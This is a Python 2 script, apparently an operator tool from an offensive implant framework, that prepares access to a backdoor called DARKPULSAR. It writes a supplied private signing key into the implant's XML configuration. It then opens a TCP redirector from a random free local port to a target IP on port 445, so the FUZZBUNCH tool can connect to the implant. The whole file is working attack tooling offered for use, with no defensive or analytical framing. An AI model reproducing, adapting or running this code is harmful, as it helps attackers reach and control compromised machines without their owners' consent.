
import sys
import ops
import dsz
import os.path
import ops.data
import random
from optparse import OptionParser
from xml.etree.ElementTree import *

def main(args):
    if ((args.keyfile is None) or (args.target is None)):
        ops.error('You must provide a keyfile and a target IP, please try again with -k and -t')
        return
    confxml = ElementTree()
    configxmlfilename = os.path.join(dsz.lp.GetResourcesDirectory(), '..', 'implants', 'Darkpulsar-1.0.0.0.xml')
    confxml.parse(configxmlfilename)
    f = open(args.keyfile)
    try:
        newkey = f.read()
    except Exception as ex:
        ops.error('Error reading keyfile')
        raise ex
    finally:
        f.close()
    for ele in confxml.findall('{urn:trch}inputparameters'):
        for subele in ele.findall('{urn:trch}parameter'):
            if (subele.get('name') == 'SigPrivateKey'):
                for keyele in subele.findall('{urn:trch}default'):
                    keyele.text = newkey
    outfile = open(configxmlfilename, 'w')
    try:
        confxml.write(outfile)
    except Exception as ex:
        ops.error('Could not update the FUZZBUNCH config for DAPU')
        raise ex
    finally:
        outfile.close()
    redirport = 0
    dsz.control.echo.Off()
    (success, cmdid) = dsz.cmd.RunEx('local netconnections', dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    print cmdid
    conns = ops.data.getDszObject(cmdid=cmdid).initialconnectionlistitem.connectionitem
    while (redirport == 0):
        redirport = random.randint(10000, 65500)
        for conn in conns:
            if (conn.local.port == redirport):
                redirport = 0
                break
    dsz.cmd.Run(('redirect -tcp -lplisten %d -target %s %s' % (redirport, args.target, args.port)))
    ops.info(('Your redirector has been started, local listening port to connect for DAPU is %d' % redirport))
    ops.info('You can now start FUZZBUNCH to connect to DARKPULSAR.  If you already launched FUZZBUNCH, you will need to start it again')
if (__name__ == '__main__'):
    usage = 'python darkpulsar.py [Options] -project DaPu\n-t, --target\n    Remote target to connect to\n-p, --port\n    Target port to hit (default: 445)\n-k, --keyfile\n    Keyfile name to use\n'
    parser = OptionParser(usage=usage)
    parser.add_option('-k', '--keyfile', dest='keyfile', type='string', action='store', default=None)
    parser.add_option('-p', '--port', dest='port', type='string', action='store', default='445')
    parser.add_option('-t', '--target', dest='target', type='string', action='store', default=None)
    (options, args) = parser.parse_args(sys.argv)
    main(options)